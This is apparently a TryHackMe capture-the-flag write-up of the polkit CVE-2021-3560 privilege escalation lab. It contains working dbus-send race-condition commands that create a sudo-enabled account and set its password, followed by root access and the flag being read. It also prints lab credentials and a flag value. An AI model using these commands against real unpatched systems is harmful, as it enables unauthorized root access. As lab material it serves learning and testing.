#CVE-2021-3560
```Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

- When you complete the box you will find a flag at `/root/root.txt`. This will not look like a regular TryHackMe flag:  
    ![](https://assets.muirlandoracle.co.uk/dynamic-flags/dcea915bae97.png)  
    Everything in the file should be submitted as a flag -- including any symbols or special characters.  
    
- This flag will be different every time you deploy the box. Each flag can be used exactly once, and will expire after six hours (so make sure to submit quickly!)  
    
- When you have retrieved the flag, **do not submit it directly into the TryHackMe answer field**. Dynamic flags should be submitted to [https://flag.muir.land/](https://flag.muir.land/). This site is run by the room author and is not affiliated directly with TryHackMe.
- You will be asked to submit three pieces of information:
    - Your username. It is _very_ important that this is identical to your TryHackMe username!
    - The box code. In most instances this will be the same as the room code. For this room the code will be: _**polkit**_
    - The flag
```

Now lets start
```Overview
In early 2021 a researcher named [Kevin Backhouse](https://github.blog/author/kevinbackhouse/) discovered a seven year old privilege escalation vulnerability (since designated CVE-2021-3560) in the Linux polkit utility. Fortunately, different distributions of Linux (and even different versions of the same distributions) use different versions of the software, meaning that only some are vulnerable.

Specifically, the following mainstream distributions, amongst others, were vulnerable:

- Red Hat Enterprise Linux 8
- Fedora 21 (or later)
- Debian Testing ("Bullseye")
- Ubuntu 20.04 LTS ("Focal Fossa")  
    

All should now have released patched versions of their respective polkit packages, however, if you encounter one of these distributions then it may still be vulnerable if it hasn't been updated for a while.

For this room we will be focussing specifically on Ubuntu 20.04. Canonical released a patch for their version of polkit (`policykit-1`), which has version number `0.105-26ubuntu1.1`. The last vulnerable version available in the apt repositories for Focal Fossa is `0.105-26ubuntu1`, so, if you see this, you may be in luck!

We can use `apt list --installed | grep policykit-1` to check the installed version of polkit:
```

## Background
```bash
tryhackme@polkit:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
tryhackme@polkit:~$ apt list --installed | grep policykit-1

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

policykit-1/focal,now 0.105-26ubuntu1 amd64 [installed,upgradable to: 0.105-26ubuntu1.1]
```

```Steps
For the sake of keeping this room relatively light, we won't go too deep into the specifics behind this (although reading the [full article on the vulnerability](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#about) is highly recommended). Effectively, the vulnerability can be boiled down to these steps:

1. The attacker manually sends a dbus message to the accounts-daemon requesting the creation of a new account with sudo permissions (or latterly, a password to be set for the new user). This message gets given a unique ID by the dbus-daemon.  
    
2. The attacker kills the message after polkit receives it, but before polkit has a chance to process the message. This effectively destroys the unique message ID.
3. Polkit asks the dbus-daemon for the user ID of the user who sent the message, referencing the (now deleted) message ID.
4. The dbus-daemon can't find the message ID because we killed it in step two. It handles the error by responding with an error code.
5. Polkit mishandles the error and substitutes in 0 for the user ID -- i.e. the root account of the machine.  
    
6. Thinking that the root user requested the action, polkit allows the request to go through unchallenged.
```

## Practical
```bash 
tryhackme@polkit:~$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_cal
l --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker
 string:"Pentester Account" int32:1
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real0m0.011s
user0m0.002s
sys0m0.000s

tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accountsorg.freedesktop.Accounts.CreateUser string:attacker stri
ng:"Pentester Account" int32:1 & sleep 0.005s; kill $!
[1] 1305

tryhackme@polkit:~$ id attacker
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1

tryhackme@polkit:~$ openssl passwd -6 Expl01ted
$6$nsuhfAPRdIVRrLaj$.eXTTI2z2rqlaW/Fx7CJcaMabLaV2F40iydS5wFekICZrOqeKYBgCkAWoMfyB3EHWhySS.5WoGdsTVrMAVJ4Q.
```

## Next Step
```bash
tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000org.freedesktop.Accounts.User.SetPassword strin
g:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
[1] 1344
```

## Login using attacker user

Credentials
```bash
tryhackme@polkit:~$ su attacker
Password: [password omitted]
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
attacker@polkit:/home/tryhackme$ sudo -l
Matching Defaults entries for attacker on polkit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User attacker may run the following commands on polkit:
    (ALL : ALL) ALL

```

## Execution
```bash
attacker@polkit:/home/tryhackme$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
attacker@polkit:/home/tryhackme$ sudo -s
root@polkit:/home/tryhackme# cat /root/root.txt
EUUf+9CEAKU=-42c85h3ZgFl3LsQOCxqTMwcdekV3UXRfDQl8W0wbVNgMx2aCqTjGV33qnSID6nOcau24AA==
```

Submitted on 
```Flag
You've seen the theory, so now it's time to try for yourself!

If you would like to SSH into the target machine, the credentials are:

- Username: `tryhackme`
- Password: `TryHackMe123!`

Otherwise please feel free to use the in-browser access on the right hand side of the screen. Bear in mind that the AttackBox _can_ be deployed in tandem with the target machine.

Perform the CVE-2021-3560 exploit and get the flag from `/root/root.txt`!  
**Remember to submit the flag you find on the box to [https://flag.muir.land/](https://flag.muir.land/) in order to receive the final flag to submit below.**
```
`https://flag.muir.land/`
details i have submitted in order to gain flag
```Details 
Username - Gh0ulH4x
Box Code - polkit
Flag - EUUf+9CEAKU=-42c85h3ZgFl3LsQOCxqTMwcdekV3UXRfDQl8W0wbVNgMx2aCqTjGV33qnSID6nOcau24AA==
```

## Main Flag
```Flag
[flag omitted]
```